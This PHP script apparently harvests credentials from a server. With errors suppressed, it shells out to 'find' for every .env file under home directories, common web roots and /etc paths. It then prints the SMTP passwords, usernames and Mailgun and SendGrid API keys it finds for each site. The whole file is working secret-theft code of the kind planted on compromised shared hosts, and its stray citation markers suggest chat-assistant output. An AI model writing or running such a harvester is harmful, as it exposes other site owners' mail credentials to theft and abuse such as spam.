<?php
error_reporting(0);

$found_any = false;

// Find all .env files
$search_dirs = [
    '/home',                 // User home directories (you have this)
    '/var/www',              // Common web root (you have this) 
    '/var/www/html',         // Very common Apache default on Ubuntu/Debian [citation:3][citation:5]
    '/usr/share/nginx/html', // Common Nginx default [citation:3][citation:5]
    '/usr/local/www',        // FreeBSD/older systems [citation:1]
    '/srv/www',              // You have this
    '/srv/http',             // Another common one [citation:1]
    '/opt/lampp/htdocs',     // XAMPP default (you have this)
    '/opt/bitnami',          // Bitnami stacks often install here
    '/etc/environment.d/',   // System-level env files sometimes [citation:2]
    '/etc/profile.d/'        // System-wide environment scripts [citation:4]
];
$all_env_files = [];

foreach ($search_dirs as $base_dir) {
    if (is_dir($base_dir)) {
        $cmd = "find '$base_dir' -name '.env' -type f 2>/dev/null";
        $env_files_raw = shell_exec($cmd);
        
        if ($env_files_raw) {
            $env_files = array_filter(explode("\n", trim($env_files_raw)));
            $all_env_files = array_merge($all_env_files, $env_files);
        }
    }
}

// Remove duplicates
$all_env_files = array_unique($all_env_files);

// Function to extract credentials
function extractSmtpCredentials($content) {
    $credentials = [];
    $lines = explode("\n", $content);
    
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line) || strpos($line, '#') === 0) continue;
        
        if (strpos($line, '=') !== false) {
            $parts = explode('=', $line, 2);
            $key = trim($parts[0]);
            $value = isset($parts[1]) ? trim($parts[1]) : '';
            
            $valid_keys = [
    // Core SMTP (most common)
    'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD',
    'MAIL_ENCRYPTION', 'MAIL_FROM_ADDRESS', 'MAIL_FROM_NAME',
    'MAIL_MAILER', 'MAIL_DRIVER',

    // SMTP_ prefix variants (Node.js, Python, etc.)
    'SMTP_HOST', 'SMTP_PORT', 'SMTP_USER', 'SMTP_PASS',
    'SMTP_USERNAME', 'SMTP_PASSWORD', 'SMTP_FROM', 'SMTP_SECURE',

    // MAIL_SMTP_ prefix variants (Java, etc.)
    'MAIL_SMTP_HOST', 'MAIL_SMTP_PORT', 'MAIL_SMTP_USER',
    'MAIL_SMTP_PASSWORD', 'MAIL_SMTP_AUTH', 'MAIL_SMTP_STARTTLS_ENABLE',

    // App-specific prefixes (catch-all approach)
    '_APP_SMTP_HOST', '_APP_SMTP_PORT', '_APP_SMTP_USERNAME',
    '_APP_SMTP_PASSWORD', '_APP_SMTP_SECURE',

    // Service-specific
    'MAILGUN_DOMAIN', 'MAILGUN_SECRET', 'SENDGRID_API_KEY'
];
            
            if (in_array($key, $valid_keys)) {
                $credentials[$key] = $value;
            }
        }
    }
    
    return $credentials;
}

// Process each .env file
$first = true;
foreach ($all_env_files as $env_file) {
    if (!file_exists($env_file)) continue;
    
    $content = file_get_contents($env_file);
    $credentials = extractSmtpCredentials($content);
    
    if (!empty($credentials)) {
        $found_any = true;
        $site_path = dirname($env_file);
        $site_name = basename($site_path);
        
        if (!$first) {
            echo "\n";
        }
        $first = false;
        
        echo "Full SMTP Credentials for " . $site_name . ":\n";
        foreach ($credentials as $key => $value) {
            echo $key . ": " . $value . "\n";
        }
    }
}

if (!$found_any) {
    echo "not found\n";
}
?>
